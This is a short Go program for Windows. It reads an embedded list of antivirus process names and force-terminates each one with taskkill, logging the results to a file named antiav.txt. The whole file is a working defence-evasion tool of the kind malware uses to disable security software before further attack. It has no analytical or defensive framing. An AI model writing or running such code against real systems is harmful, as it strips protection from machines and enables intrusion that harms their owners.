package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

//go:embed AvList.txt
var avList string

var f *os.File

func main() {
	if runtime.GOOS != "windows" {
		fmt.Println("This application should run only under Windows")
		os.Exit(1)
	}
	var err error
	f, err = os.Create("C:\\antiav.txt")
	if err != nil {
		panic(err)
	}
	defer f.Close()
	for _, each := range strings.Split(avList, "\n") {
		TaskKill(each)
	}
}

func TaskKill(name string) {
	name = strings.TrimSpace(name)
	name = strings.ReplaceAll(name, " ", "")
	fmt.Fprintf(f, "Kill: \"%s\"\n", name)
	cmd := exec.Command("taskkill.exe", "/IM", name, "/F", "/T")
	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(string(output), "not found") {
			return
		}
		fmt.Println("Error: ", err)
	}
	fmt.Println(string(output))
	fmt.Fprintf(f, "%s: %s", name, string(output))
}
